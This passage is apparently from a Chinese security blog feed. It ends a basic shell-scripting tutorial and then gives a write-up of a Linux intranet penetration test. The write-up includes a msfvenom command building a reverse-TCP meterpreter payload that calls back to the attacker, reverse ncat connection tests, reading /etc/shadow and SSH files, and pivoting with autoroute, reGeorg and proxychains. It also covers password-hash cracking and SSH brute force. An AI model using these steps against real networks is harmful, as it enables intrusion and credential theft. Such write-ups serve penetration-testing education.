<h3 id="shell输入输出重定向"><a href="#shell输入输出重定向" class="headerlink" title="shell输入输出重定向"></a>shell输入输出重定向</h3><h4 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">换行：<span class="built_in">echo</span> -e <span class="string">"OK! \n"</span>    <span class="comment">#-e 开启转义</span></div><div class="line">不换行：<span class="built_in">echo</span> -e <span class="string">"OK! \c"</span>   <span class="comment">#-e 开启转义 \c 不换行</span></div><div class="line">输出变量名：<span class="built_in">echo</span> <span class="string">'$a'</span> 输出<span class="variable">$a</span>    使用单引号即可</div><div class="line">输出命令执行结果：<span class="built_in">echo</span> `date`   使用反引号</div></pre></td></tr></table></figure>
<h4 id="printf"><a href="#printf" class="headerlink" title="printf"></a>printf</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">printf</span> <span class="string">"%-10s %-8s %-4s\n"</span></div><div class="line"><span class="built_in">printf</span> <span class="string">"%-10s %-8s %-4.2f\n"</span></div><div class="line"><span class="built_in">printf</span> <span class="string">"%-10s %-8s %-4.2f\n"</span></div><div class="line"><span class="built_in">printf</span> <span class="string">"%-10s %-8s %-4.2f\n"</span></div></pre></td></tr></table></figure>
<p>%s %c %d %f都是格式替代符%-10s指一个宽度为10个字符（-表示左对齐，没有则表示右对齐），任何字符都会被显示在10个字符宽的字符内，如果不足则自动以空格填充，超过也会将内容全部显示出来。%-4.2f指格式化为小数，其中.2指保留2位小数。</p>
<h3 id="shell传参"><a href="#shell传参" class="headerlink" title="shell传参"></a>shell传参</h3><p>shell代码内容<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/bash</span></div><div class="line"><span class="built_in">echo</span> <span class="variable">$0</span></div><div class="line"><span class="built_in">echo</span> <span class="variable">$1</span></div><div class="line"><span class="built_in">echo</span> <span class="variable">$2</span></div></pre></td></tr></table></figure></p>
<p>运行脚本并传参<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./shell.sh a b</div></pre></td></tr></table></figure></p>
<p>输出结果<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">./shell.sh</div><div class="line">a</div><div class="line">b</div></pre></td></tr></table></figure></p>
<h4 id="特殊参数"><a href="#特殊参数" class="headerlink" title="特殊参数"></a>特殊参数</h4><ul>
<li>$#    传递到脚本的参数个数</li>
<li>$<em>    以一个单字符串显示所有向脚本传递的参数。<br>如”$</em>“用「”」括起来的情况、以”$1 $2 … $n”的形式输出所有参数。</li>
<li>$$    脚本运行的当前进程ID号</li>
<li>$!    后台运行的最后一个进程的ID号</li>
<li>$@    与$*相同，但是使用时加引号，并在引号中返回每个参数。<br>如”$@”用「”」括起来的情况、以”$1” “$2” … “$n” 的形式输出所有参数。</li>
<li>$-    显示Shell使用的当前选项，与set命令功能相同。</li>
<li>$?    显示最后命令的退出状态。0表示没有错误，其他任何值表明有错误。</li>
</ul>
<h3 id="shell函数"><a href="#shell函数" class="headerlink" title="shell函数"></a>shell函数</h3><h4 id="基本格式"><a href="#基本格式" class="headerlink" title="基本格式"></a>基本格式</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">[ <span class="keyword">function</span> ] funname [()]</div><div class="line"></div><div class="line">&#123;</div><div class="line"></div><div class="line">    action;</div><div class="line"></div><div class="line">    [<span class="built_in">return</span> int;]</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">Test</span></span>()</div><div class="line">&#123;</div><div class="line"></div><div class="line"><span class="variable">$a</span>=“123”</div><div class="line"><span class="built_in">return</span> <span class="variable">$a</span></div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="函数使用并获取返回值"><a href="#函数使用并获取返回值" class="headerlink" title="函数使用并获取返回值"></a>函数使用并获取返回值</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Test</div><div class="line"><span class="built_in">echo</span> $?    <span class="comment"># $?为函数返回值</span></div></pre></td></tr></table></figure>
<h4 id="函数传参"><a href="#函数传参" class="headerlink" title="函数传参"></a>函数传参</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#函数定义</span></div><div class="line"><span class="function"><span class="title">Test</span></span>()</div><div class="line">&#123;</div><div class="line"><span class="built_in">echo</span> <span class="variable">$1</span></div><div class="line"><span class="built_in">echo</span> <span class="variable">$2</span></div><div class="line"><span class="built_in">echo</span> <span class="variable">$3</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">#函数使用</span></div><div class="line">Test a b c</div></pre></td></tr></table></figure>
<h3 id="shell流程控制"><a href="#shell流程控制" class="headerlink" title="shell流程控制"></a>shell流程控制</h3><h4 id="if条件语句"><a href="#if条件语句" class="headerlink" title="if条件语句"></a>if条件语句</h4><h5 id="if-then-else-fi"><a href="#if-then-else-fi" class="headerlink" title="if-then-else-fi"></a>if-then-else-fi</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> condition</div><div class="line"><span class="keyword">then</span></div><div class="line">    command1 </div><div class="line">    command2</div><div class="line">    ...</div><div class="line">    commandN</div><div class="line"><span class="keyword">else</span></div><div class="line">    <span class="built_in">command</span></div><div class="line"><span class="keyword">fi</span></div></pre></td></tr></table></figure>
<h5 id="if-then-elif-then-else-fi"><a href="#if-then-elif-then-else-fi" class="headerlink" title="if-then-elif-then-else-fi"></a>if-then-elif-then-else-fi</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> condition1</div><div class="line"><span class="keyword">then</span></div><div class="line">    command1</div><div class="line"><span class="keyword">elif</span> condition2 </div><div class="line"><span class="keyword">then</span> </div><div class="line">    command2</div><div class="line"><span class="keyword">else</span></div><div class="line">    commandN</div><div class="line"><span class="keyword">fi</span></div></pre></td></tr></table></figure>
<h4 id="for循环语句"><a href="#for循环语句" class="headerlink" title="for循环语句"></a>for循环语句</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> var <span class="keyword">in</span> item1 item2 ... itemN</div><div class="line"><span class="keyword">do</span></div><div class="line">    command1</div><div class="line">    command2</div><div class="line">    ...</div><div class="line">    commandN</div><div class="line"><span class="keyword">done</span></div></pre></td></tr></table></figure>
<p>一句话for循环shell<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(ps -ef | grep python | awk <span class="string">'&#123;print $2&#125;'</span>);<span class="keyword">do</span> <span class="built_in">kill</span> <span class="variable">$i</span>;<span class="keyword">done</span></div></pre></td></tr></table></figure></p>
<h4 id="while循环语句"><a href="#while循环语句" class="headerlink" title="while循环语句"></a>while循环语句</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">int=1</div><div class="line"><span class="keyword">while</span>(( <span class="variable">$int</span>&lt;=5 ))</div><div class="line"><span class="keyword">do</span></div><div class="line">        <span class="built_in">echo</span> <span class="variable">$int</span></div><div class="line">        <span class="built_in">let</span> <span class="string">"int++"</span></div><div class="line"><span class="keyword">done</span></div></pre></td></tr></table></figure>
<h3 id="shell实战"><a href="#shell实战" class="headerlink" title="shell实战"></a>shell实战</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#! /bin/bash</span></div><div class="line"></div><div class="line"><span class="comment">#shell综合运用</span></div><div class="line"></div><div class="line">a=`whoami` <span class="comment">#执行命令</span></div><div class="line">b=`date`</div><div class="line">c=<span class="string">"open"</span></div><div class="line">d=`cat test.log | grep <span class="variable">$c</span>`</div><div class="line"></div><div class="line"><span class="built_in">echo</span> <span class="variable">$d</span></div><div class="line"><span class="built_in">echo</span> <span class="string">"user is <span class="variable">$a</span> time is <span class="variable">$b</span>"</span></div></pre></td></tr></table></figure>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="http://www.runoob.com/linux/linux-shell.html" target="_blank" rel="external">http://www.runoob.com/linux/linux-shell.html</a></p>
<h3 id="传送门"><a href="#传送门" class="headerlink" title="传送门"></a>传送门</h3><p><a href="https://thief.one/2017/08/09/2/">【玩转linux系统】Linux内网渗透</a><br><a href="https://thief.one/2017/08/09/1/">【玩转linux系列】Vim使用</a><br><a href="https://thief.one/2017/08/08/1/">【玩转linux系列】Linux基础命令</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;我猜你可能会问我为什么最近更新得这么勤？&lt;br&gt;因为我在充电！&lt;br&gt;&lt;/blockquote&gt;&lt;br&gt;　　如果你去问程序员哪种编程语言最好用，可能会得到很多种答案。但如果问linux下哪种语言使用最方便，shell当之无愧，因为其相当于windows下的bat，可以自动化一些命令操作。当然linux内置安装了很多脚本语言，比如ruby、python等，使用也很方便。作为一名python爱好者，我一般习惯用python去解决问题，但为了能够看懂别人的shell代码，为此也需要学习一些基础的shell语法。&lt;br&gt;
    
    </summary>
    
      <category term="编程之道" scheme="http://thief.one/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="linux" scheme="http://thief.one/tags/linux/"/>
    
      <category term="shell" scheme="http://thief.one/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title>【玩转linux系统】Linux内网渗透</title>
    <link href="http://thief.one/2017/08/09/2/"/>
    <id>http://thief.one/2017/08/09/2/</id>
    <published>2017-08-09T08:24:01.000Z</published>
    <updated>2017-08-21T12:45:51.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">Nothing great was ever achieved without enthusiasm<br>无热情成就不了伟业<br></blockquote><br>　　前段时间做了一次不算成功也不算完整的linux内网渗透，不算成功是因为并没有拿下内网中其他服务器的权限，不算完整是因为由于某些原因测试被迫暂时中止。虽然这次linux内网渗透不算是一个很好的教学案例，但我还是决定把过程记录一下，尤其重点记录linux内网渗透的思路，以防遗忘。<br><a id="more"></a><br>　　网上关于内网渗透的资料很多，我在做测试之前也是翻阅了很多资料。本篇标题突出linux，是因为本次测试不涉及windows系统，当然linux与windows内网渗透的原理差不多，只不过使用的工具有所区别。</p>
<h3 id="收集测试网络环境"><a href="#收集测试网络环境" class="headerlink" title="收集测试网络环境"></a>收集测试网络环境</h3><p>　　当我们拿到一台目标内网服务器，或者说肉鸡服务器，首先要做的就是收集信息。而在我看来需要收集的信息中，最重要的之一便是肉鸡的网络环境。</p>
<h4 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h4><p>首先介绍下本次测试的服务器环境：</p>
<ul>
<li>攻击机Mac：110.xx.xx.xx   外网 </li>
<li>肉鸡centos：192.168.16.x  目标内网16网段系统</li>
<li>内网渗透范围：192.168.17.0/24  目标内网17网段系统</li>
</ul>
<p>本次测试模拟假设：由于肉鸡服务器上对外开放了存在漏洞的web应用，被入侵植入webshell。<br>本次测试目的：通过肉鸡服务器上的shell，深入渗透内网17网段的服务器。</p>
<h4 id="收集测试哪些网络数据？"><a href="#收集测试哪些网络数据？" class="headerlink" title="收集测试哪些网络数据？"></a>收集测试哪些网络数据？</h4><p>　　ok，目前我已经拥有了肉鸡的shell，那么该收集肉鸡服务器的哪些网络环境呢？又该如何去测试？我认为至少要收集以下几点网络环境信息：</p>
<ul>
<li>肉鸡服务器与外网的连通性</li>
<li>肉鸡服务器与内网其他网段的连通性</li>
<li>肉鸡服务器与外网之间是否有端口访问限制</li>
<li>肉鸡服务器与内网其他网段之间是否有端口访问限制</li>
</ul>
<p>注：连通性主要是指能否ping通，需要双方互相ping测试；端口访问限制，指的是目标网络边界是否有堡垒机或者防火墙，对进出的端口是否有做限制。</p>
<h4 id="端口访问限制测试"><a href="#端口访问限制测试" class="headerlink" title="端口访问限制测试"></a>端口访问限制测试</h4><p>ping测试这里不介绍了，主要说下如何测试端口访问限制，可以使用的工具如下：</p>
<ul>
<li>curl、wget（可连接web服务，主要为80、443、8000+端口）</li>
<li>telnet（可主动连接指定ip的指定port）</li>
<li>nmap（可扫描端口，open或者filter）</li>
<li>ncat（可以创建端口监听，也可以主动连接）</li>
<li>python（可主动创建端口监听）<br>……</li>
</ul>
<p>在测试端口访问限制前，我们先要搞清楚当前的网络环境。本次测试中，攻击机在外网而肉鸡在内网，因此正常情况下攻击机是无法直接访问到肉鸡上某个端口的（需要网络边界路由器做端口映射）。</p>
<h5 id="反向连接测试"><a href="#反向连接测试" class="headerlink" title="反向连接测试"></a>反向连接测试</h5><p>我们在测试端口访问限制时，首先可以利用ncat在攻击机上监听一个端口。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ncat -l -p 9999</div></pre></td></tr></table></figure></p>
<p>然后利用ncat或者telnet等工具在肉鸡上尝试连接，我称之为反向连接测试。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ncat 110.xx.xx.xx 9999</div></pre></td></tr></table></figure></p>
<p>注：监听的端口可以随机选取，尽量选取多个端口尝试多次；如果肉鸡能够访问攻击机的任何端口，说明目标网络边界没有对出方向的连接做限制，了解这方面的信息对后面的端口转发有很大好处。</p>
<h5 id="正向连接测试"><a href="#正向连接测试" class="headerlink" title="正向连接测试"></a>正向连接测试</h5><p>　　我们也可以在肉鸡上监听一个端口，攻击机上尝试连接（这里连接的是肉鸡的外网ip地址，肉鸡对外开放的web应用肯定是以一个外网ip或者域名的形式存在，而该ip在本次测试中并不是肉鸡真正的ip地址，是目标边界网络设备的ip，原理是通过端口映射将网络设备（外网ip）上的web端口映射到了肉鸡（内网ip）的web端口上），我称之为正向连接测试。<br>　　尝试连接肉鸡外网地址的端口，意义在于有些粗心的管理员会在网络设备上设置全端口映射，也就是说肉鸡上监听任何端口都能映射到网络边界设备的相同端口上，那么这跟肉鸡服务器直接处在外网就没差了。</p>
<h3 id="收集服务器信息"><a href="#收集服务器信息" class="headerlink" title="收集服务器信息"></a>收集服务器信息</h3><p>收集信息可以说是渗透测试的第一步，内网渗透也一样，收集的服务器信息越多，渗透的成功率就越大。</p>
<h4 id="查看系统内核"><a href="#查看系统内核" class="headerlink" title="查看系统内核"></a>查看系统内核</h4><p>linux系统上查看内核版本如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lsb_release –a</div></pre></td></tr></table></figure></p>
<p>　　一般系统的入侵途径是先提权，而提权可以通过linux内核漏洞进行，因此可以先查看linux内核版本，然后根据内核<a href="https://www.kernel-exploits.com/" target="_blank" rel="external">寻找exp的网站</a>，上传exp进行提权。由于本次测试不涉及提权部分，因此不做测试，另外补充一句：内核提权有宕机风险，请谨慎操作。</p>
<h4 id="查看操作系统位数"><a href="#查看操作系统位数" class="headerlink" title="查看操作系统位数"></a>查看操作系统位数</h4><p>linux系统上查看位数如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">getconf LONG_BIT</div></pre></td></tr></table></figure></p>
<p>说明：知道系统是32位还是64位对后期生成msf木马有帮助。</p>
<h4 id="系统敏感信息"><a href="#系统敏感信息" class="headerlink" title="系统敏感信息"></a>系统敏感信息</h4><p>收集一些系统相关的敏感信息，比如账号密码、日志、历史命令、ssh文件等。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">/etc/shadow</div><div class="line">/etc/passwd</div><div class="line">/var/<span class="built_in">log</span></div><div class="line"><span class="built_in">history</span></div><div class="line">.ssh</div><div class="line">......</div></pre></td></tr></table></figure></p>
<h4 id="web敏感信息"><a href="#web敏感信息" class="headerlink" title="web敏感信息"></a>web敏感信息</h4><p>如果服务器存在web应用，可以查看web目录下是否存在敏感信息，比如连接数据库的配置文件等等。</p>
<h3 id="内网扫描"><a href="#内网扫描" class="headerlink" title="内网扫描"></a>内网扫描</h3><p>　　当信息收集完成后，可以尝试扫描一下内网的机器，比如主机存活扫描、端口扫描、arp扫描等。端口扫描可以使用nmap、msf等工具，但如果服务器上没有安装这些工具时，通常有3种手段可以达到内网端口扫描的效果。第一种就是服务器上安装扫描工具，这里不多说也不推荐，因为动静大且麻烦(当然可以上传python扫描端口的脚本，不需要编译安装，比较方便。)；第二种就是端口转发，将服务器内网端口转发到外网进行扫描；第三种就是代理扫描，也就是把装有扫描工具的攻击机代理到目标内网环境。<br>　　无论是端口转发扫描还是代理扫描，原理都是打通攻击机（外网）与肉鸡（内网）的连通性，即让攻击机可以直接访问到肉鸡所在的内网资源。这里的连接不借助于目标网络边界设备的端口映射功能，因此与攻击机访问肉鸡web服务所产生的连接有所区别。</p>
<h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><p>　　想要达到以上所介绍的彼此”直接”的连接，我们需要一个中间的桥梁，来传递内外网（攻击机与肉鸡）之间的数据。搭建这种桥梁的方式有很多，我们首先可以想到端口转发，即把肉鸡服务器上的某个端口转发到攻击机的某个端口上，这样攻击机上访问本机某个端口，就相当于访问了肉鸡服务器上的某个端口。</p>
<p>端口转发的工具：lcx、meterpreter等，具体用法后面会介绍<br>端口转发类型：tcp端口转发、http转发、ssh转发等</p>
<h5 id="tcp端口转发"><a href="#tcp端口转发" class="headerlink" title="tcp端口转发"></a>tcp端口转发</h5><p>本机转发：攻击机上监听2222、3333端口，肉鸡上连接攻击机的2222端口，并转发肉鸡22端口。<br>转发连接原理：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">肉鸡22端口&lt;--&gt;肉鸡随机高端口&lt;--&gt;肉鸡随机高端口&lt;--&gt;攻击机上2222高端口&lt;--&gt;攻击机随机高端口&lt;--&gt;攻击机3333端口</div></pre></td></tr></table></figure></p>
<p>注：此时我们去连接攻击机的3333端口，就相当于连接了肉鸡的22端口。</p>
<p>远程转发：攻击机上监听2222、3333端口，肉鸡上连接攻击机的2222端口，并转发内网目标服务器的22端口。（前提是肉鸡能够连接目标服务器的22端口）<br>转发连接原理：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">内网目标服务器22端口&lt;--&gt;肉鸡随机高端口&lt;--&gt;肉鸡随机高端口&lt;--&gt;攻击机上2222高端口&lt;--&gt;攻击机随机高端口&lt;--&gt;攻击机3333端口</div></pre></td></tr></table></figure></p>
<p>注：此时我们去连接攻击机的3333端口，就相当于连接了目标服务器的22端口。<br>　　<br>说明：从上面的连接过程不难看出，端口转发比较难以防范的原因就在于，攻击机上监听的端口是随机的，不可预知的，因此不可能事先在堡垒机或者防火墙上做出方向的端口策略，除非禁止服务器访问外部所有端口（现实情况大多只对进方向的端口连接做限制）。</p>
<h5 id="http转发"><a href="#http转发" class="headerlink" title="http转发"></a>http转发</h5><p>　　有些安全意思强的管理员，会对一些服务器做禁止访问外网的策略，即服务器禁止连接任何外网的端口。此时普通的tcp端口转发就没有效果了，因为转发的前提是要能互相连接上。此种情况，可以使用http转发。<br>转发连接原理：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">肉鸡web端口(80)&lt;--&gt;网络边界设备端口(80)&lt;--&gt;攻击机随机端口</div></pre></td></tr></table></figure></p>
<p>注：这里之所以能够连通，是借助了服务器上的web服务，以及网络边界设备的映射功能。</p>
<p>说明：虽然肉鸡不能访问外网任何端口，但只要它对外提供web服务，就说明它还能跟外界通信，只不过这种通信局限于web服务端口中，并且肉鸡不是直接跟攻击机通信，而是借助了边界设备。</p>
<h4 id="代理扫描内网"><a href="#代理扫描内网" class="headerlink" title="代理扫描内网"></a>代理扫描内网</h4><p>　　以上介绍了几种端口转发的使用以及原理，从中我们不难看出端口转发固然厉害，但也很局限，因为每次都只能转发一个ip的一个端口，对于扫描来说，并不是最好的选择方案。因此出现了一种更好的技术方案–代理扫描，其原理与端口转发差不多，都是需要搭建一个桥梁，而这个桥梁往往不是某个端口，而是shell或者说session。</p>
<p>代理扫描同样可以分为tcp代理扫描、http代理扫描。</p>
<h5 id="http代理转发"><a href="#http代理转发" class="headerlink" title="http代理转发"></a>http代理转发</h5><p>如果目标服务器有web系统，可以使用Regeorg + proxychains。<br>工具下载：<a href="https://github.com/sensepost/reGeorg" target="_blank" rel="external">reGeorg</a>、<a href="https://github.com/rofl0r/proxychains-ng" target="_blank" rel="external">proxychains</a><br>将reGeorg的tunnel文件上传到肉鸡服务器到网站目录下，攻击机执行：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python reGeorgSocksProxy.py -p 2333 -u http://test.com/tunnel.php</div></pre></td></tr></table></figure></p>
<p>然后修改proxychains.conf 配置文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vim /etc/proxychains.conf   （mac上在~/.proxychains/proxychains.conf ,没有则自己创建）</div></pre></td></tr></table></figure></p>
<p>在最后一行添加socks5 127.0.0.1 2333(与regeorg设置的端口相同)</p>
<p>最后在攻击机使用扫描工具时，可以在执行的命令前加proxhchains4, 比如：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">proxychains4 nmap -sT -Pn -n 192.168.16.0/24</div></pre></td></tr></table></figure></p>
<p>注：此方案适合攻击者与肉鸡服务器都在各自内网环境，攻击者可以访问到目标服务器的http服务，通过该http服务进行代理转发（速度较慢）.</p>
<h5 id="tcp代理转发"><a href="#tcp代理转发" class="headerlink" title="tcp代理转发"></a>tcp代理转发</h5><p>思路：通过metasploit木马反弹一个肉鸡的meterpreter shell到攻击机上，然后在meterpreter shell上设置路由，我们便可以在攻击机上直接扫描肉鸡所在的网段服务器（这里是可以跨网段扫描的）。</p>
<h6 id="生成msf木马"><a href="#生成msf木马" class="headerlink" title="生成msf木马"></a>生成msf木马</h6><p>生成木马：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=攻击机ip LPORT=8000 -f elf &gt; shell_8000.elf</div></pre></td></tr></table></figure></p>
<p>由于攻击机无法访问肉鸡的端口，而肉鸡可以访问攻击机的端口，因此生成一个反向的木马。</p>
<h6 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h6><p>　　攻击机运行msfconsole，使用exoloit/multi/handler模块，set payload linux/x86/meterpreter/reverse_tcp跟生成木马时用的payload一样。LPORT设置成木马将要连接的端口，运行后会在攻击机上监听一个端口，等待木马链接。<br>　　此时将shell_8000.elf上传到肉鸡服务器上，添加权限后运行木马将会主动连接上攻击机监听的端口，并在攻击机上获取一个meterpreter shell。</p>
<h6 id="设置路由"><a href="#设置路由" class="headerlink" title="设置路由"></a>设置路由</h6><p>上一步获取到了一个session，这个session是攻击机与肉鸡相互连接的会话。<br>查看下肉鸡的网络情况：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">run get_local_subnets</div></pre></td></tr></table></figure></p>
<p><img src="/upload_image/20170809/1.png" alt=""><br>添加路由:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">run autoroute -s 192.168.16.0/24</div></pre></td></tr></table></figure></p>
<p>查看路由：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">run autoroute –p</div></pre></td></tr></table></figure></p>
<p><img src="/upload_image/20170809/2.png" alt=""><br>一般来说，这里设置好路由就可以了，但是有些时候会发现在meterpreter中有效果，但是在msf中失效了，因此可以在msf中再设置一次。（但前提是meterpreter会话要一直存在）将该会话放入后台，进入msf中添加路由。<br>查看路由：<br><img src="/upload_image/20170809/3.png" alt=""><br>这里已经是添加好的结果，添加路由命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">msf exploit(handler) &gt; route add 192.168.16.0 255.255.255.0 12</div><div class="line">msf exploit(handler) &gt; route add 192.168.17.0 255.255.255.0 12</div></pre></td></tr></table></figure></p>
<p>注意：12表示session id，由于我们需要访问17网段，因此这里也要添加17网段的路由。</p>
<p>说明：以上2条路由的意思，是攻击机如果要去访问17或者16网段的资源，其下一跳是session12，至于什么是下一条这里不多说了，反正就是目前攻击机可以访问内网资源了。</p>
<p>转发连接原理：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">攻击机&lt;--&gt;meterpreter_shell（session）&lt;--&gt;肉鸡 <span class="comment"># 这里不是端口的概念，而是路由</span></div></pre></td></tr></table></figure></p>
<h5 id="tcp全局代理转发"><a href="#tcp全局代理转发" class="headerlink" title="tcp全局代理转发"></a>tcp全局代理转发</h5><p>　　通过以上设置，在msf中可以访问内网资源了，但也仅限在msf中可以访问。如果想要其他工具也能使用代理，则要设置全局代理，这需要使用msf框架中的socks4a工具代理，目录：auxiliary/server/socks4a，然后配合Proxychains ，使用方法跟http代理类似。</p>
<p>注：此代理不是http代理，是tcp代理，因此需要目标服务器或者攻击者服务器，有一方在外网的环境，不然木马端口无法连接，也就无法获取meterpreter shell。</p>
<p>metasploit操作可参考：<a href="https://thief.one/2017/08/01/1/">【渗透神器系列】Metasploit</a></p>
<h4 id="端口扫描工具"><a href="#端口扫描工具" class="headerlink" title="端口扫描工具"></a>端口扫描工具</h4><p>推荐使用metasploit进行tcp代理转发后，利用msf上面整合的很多扫描模块，直接进行扫描。<br>扫描模块：</p>
<ul>
<li>auxiliary/scanner/portscan　　端口扫描</li>
<li>scanner/portscan/syn　　SYN端口扫描</li>
<li>scanner/portscan/tcp　　TCP端口扫描<br>……</li>
</ul>
<p>除此之外，也可以使用nmap等扫描工具，结合tcp全局代理转发即可。</p>
<h3 id="针对22端口的入侵"><a href="#针对22端口的入侵" class="headerlink" title="针对22端口的入侵"></a>针对22端口的入侵</h3><p>　　扫描出内网服务器端口后，我们可以首先选择开放22端口的服务器进行入侵尝试。攻击22端口通常有2种方法，第一种是先读取肉鸡明文密码，再利用明文密码尝试登陆；第二种是字典暴力登陆。</p>
<h4 id="尝试hash破解"><a href="#尝试hash破解" class="headerlink" title="尝试hash破解"></a>尝试hash破解</h4><p>如果权限足够，我们可以顺利读取/etc/shadow文件的内容，然而是密文的，因此可以尝试用工具破解。</p>
<ul>
<li><a href="http://www.openwall.com/john/" target="_blank" rel="external">John破解hash</a></li>
<li><a href="https://github.com/hashcat/hashcat" target="_blank" rel="external">Hashcat</a></li>
</ul>
<p>注：windows下可以使用<a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="external">mimikatz</a></p>
<p>说明：获取linux账号的明文密码作用很大，因为内网环境管理员可能就那么几个，不同服务器所设置的密码也有可能相同，因此可以使用获取的服务器密码去尝试登陆其余开放了22端口的内网服务器。</p>
<h4 id="字典暴力破解"><a href="#字典暴力破解" class="headerlink" title="字典暴力破解"></a>字典暴力破解</h4><p>这个没啥好说的，主要看字典是否强大，以及是否有防止爆破限制。<br>工具：</p>
<ul>
<li>hydra</li>
<li>msf上的相应模块</li>
</ul>
